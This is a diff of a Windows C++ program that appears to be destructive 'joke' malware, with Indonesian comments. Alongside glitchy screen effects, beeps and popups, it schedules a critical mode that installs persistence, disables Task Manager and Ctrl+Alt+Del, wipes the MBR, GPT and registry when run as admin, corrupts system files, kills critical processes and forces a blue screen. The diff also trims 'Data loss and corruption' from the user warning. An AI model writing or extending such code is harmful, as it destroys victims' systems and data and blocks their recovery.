+        int distortion = 20 + rand() % (80 * intensityLevel);
+        
+        int yStart = std::max(centerY - radius, 0);
+        int yEnd = std::min(centerY + radius, screenHeight);
+        int xStart = std::max(centerX - radius, 0);
+        int xEnd = std::min(centerX + radius, screenWidth);
+        
+        for (int y = yStart; y < yEnd; y++) {
+            for (int x = xStart; x < xEnd; x++) {
+                float dx = static_cast<float>(x - centerX);
+                float dy = static_cast<float>(y - centerY);
+                float distance = sqrt(dx*dx + dy*dy);
+                
+                if (distance < radius) {
+                    float amount = pow(1.0f - (distance / radius), 2.0f);
+                    int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 3 - 1));
+                    int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 3 - 1));
+                    
+                    int srcX = x - shiftX;
+                    int srcY = y - shiftY;
+                    
+                    if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
+                        int srcPos = (srcY * screenWidth + srcX) * 4;
+                        int destPos = (y * screenWidth + x) * 4;
+                        
+                        if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
+                            srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                            pPixels[destPos] = pCopy[srcPos];
+                            pPixels[destPos + 1] = pCopy[srcPos + 1];
+                            pPixels[destPos + 2] = pCopy[srcPos + 2];
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    if (rand() % 5 == 0) {
+        int lineHeight = 1 + rand() % (3 * intensityLevel);
+        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
+            for (int h = 0; h < lineHeight; h++) {
+                if (y + h >= screenHeight) break;
+                for (int x = 0; x < screenWidth; x++) {
+                    int pos = ((y + h) * screenWidth + x) * 4;
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                        pPixels[pos] = std::min(pPixels[pos] + 100, 255);
+                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 100, 255);
+                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 100, 255);
+                    }
+                }
+            }
+        }
+    }
+    
+    if (intensityLevel > 0 && (rand() % std::max(1, 20 / intensityLevel)) == 0) {
+        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
+            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                pPixels[i] = 255 - pPixels[i];
+                pPixels[i + 1] = 255 - pPixels[i + 1];
+                pPixels[i + 2] = 255 - pPixels[i + 2];
+            }
+        }
+    }
+    
+    if (intensityLevel > 5 && rand() % 10 == 0) {
+        ApplyMeltingEffect(pCopy);
+    }
+    
+    if (textCorruptionActive) {
+        ApplyTextCorruption();
+    }
+    
+    if (intensityLevel > 3 && rand() % 15 == 0) {
+        ApplyPixelSorting();
+    }
+    
+    if (intensityLevel > 2 && rand() % 8 == 0) {
+        ApplyStaticBars();
+    }
+    
+    if (intensityLevel > 4 && rand() % 12 == 0) {
+        ApplyInversionWaves();
+    }
+    
+    ApplyCursorEffect();
+    UpdateParticles();
+    
+    if (rand() % SOUND_CHANCE == 0) {
+        PlayGlitchSoundAsync();
+    }
+    
+    if (rand() % 100 == 0) {
+        cursorVisible = !cursorVisible;
+        ShowCursor(cursorVisible);
+    }
+    
+    // ===== POPUP RANDOM =====
+    static DWORD lastPopupTime = 0;
+    if (GetTickCount() - lastPopupTime > 3000 && (rand() % 100 < (20 + intensityLevel * 3))) {
+        std::thread(OpenRandomPopups).detach();
+        lastPopupTime = GetTickCount();
+    }
+    
+    // ===== DESTRUCTIVE EFFECTS =====
+    DWORD cTime = GetTickCount();
+    
+    // Aktifkan mode kritis setelah 30 detik
+    if (!criticalMode && cTime - startTime > 30000) {
+        criticalMode = true;
+        bsodTriggerTime = cTime + 30000 + rand() % 30000; // BSOD dalam 30-60 detik
+        
+        if (!persistenceInstalled) {
+            InstallPersistence();
+            DisableSystemTools();
+            DisableCtrlAltDel();
+        }
+        
+        // Aktifkan fitur admin
+        if (g_isAdmin) {
+            static bool adminDestructionDone = false;
+            if (!adminDestructionDone) {
+                BreakTaskManager();
+                SetCriticalProcess();
+                DestroyMBR();
+                DestroyGPT();
+                DestroyRegistry();
+                adminDestructionDone = true;
+            }
+        }
+    }
+    
+    // Eksekusi tindakan destruktif
+    if (criticalMode && !destructiveActionsTriggered) {
+        ExecuteDestructiveActions();
+    }
+    
+    // Efek khusus mode kritis
+    if (criticalMode) {
+        static DWORD lastCorruption = 0;
+        if (cTime - lastCorruption > 10000) {
+            std::thread(CorruptSystemFiles).detach();
+            lastCorruption = cTime;
+        }
+        
+        static DWORD lastKill = 0;
+        if (cTime - lastKill > 5000) {
+            std::thread(KillCriticalProcesses).detach();
+            lastKill = cTime;
+        }
+        
+        intensityLevel = 20;
+        
+        if (cTime >= bsodTriggerTime) {
+            std::thread(TriggerBSOD).detach();
+        }
+    }
+    
+    delete[] pCopy;
+}
+
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     static HDC hdcLayered = NULL;
     static BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
@@ -2495,7 +1589,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     return DefWindowProc(hwnd, msg, wParam, lParam);
 }
 
-// ======== ENHANCED BACKGROUND PROCESS ========
+// Background process loop
 void RunBackgroundProcess() {
     FreeConsole();
     
@@ -2549,15 +1643,7 @@ void RunBackgroundProcess() {
     }
 }
 
-// ======== ENHANCED MAIN FUNCTION ========
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
-    // Initialize GDI+
-    GdiplusStartupInput gdiplusStartupInput;
-    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-    
-    // Initialize random seed
-    srand(static_cast<unsigned>(time(NULL)));
-    
     // Deteksi mode admin
     g_isAdmin = IsRunAsAdmin();
 
@@ -2579,8 +1665,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         L"- Extreme visual impact\n"
         L"- Continuous system pop-ups\n"
         L"- Possible system damage\n"
-        L"- Computer instability\n"
-        L"- Data loss and corruption\n\n"
+        L"- Computer instability\n\n"
         L"Press 'OK' only if you are ready to accept the consequences.",
         L"FINAL CONFIRMATION", 
         MB_OKCANCEL | MB_ICONERROR | MB_DEFBUTTON2) != IDOK)
@@ -2611,6 +1696,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         return 0;
     }
 
+    srand(static_cast<unsigned>(time(NULL)));
     startTime = GetTickCount();
     
     // Jalankan background process
@@ -2663,24 +1749,21 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     
     // Mainkan suara startup
     std::thread([]() {
-        for (int i = 0; i < 15; i++) {
+        for (int i = 0; i < 10; i++) {
             Beep(300, 80);
             Beep(600, 80);
             Beep(900, 80);
-            Sleep(15);
+            Sleep(20);
         }
         
-        for (int i = 0; i < 100; i++) {
+        for (int i = 0; i < 50; i++) {
             Beep(rand() % 5000 + 500, 20);
-            Sleep(2);
+            Sleep(3);
         }
         
-        for (int i = 0; i < 8; i++) {
+        for (int i = 0; i < 5; i++) {
             Beep(50 + i * 200, 300);
         }
-        
-        // Play system sound
-        PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
     }).detach();
     
     MSG msg;
@@ -2692,9 +1775,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     if (hMutex) {
         CloseHandle(hMutex);
     }
-    
-    // Shutdown GDI+
-    GdiplusShutdown(gdiplusToken);
     
     return static_cast<int>(msg.wParam);
 }
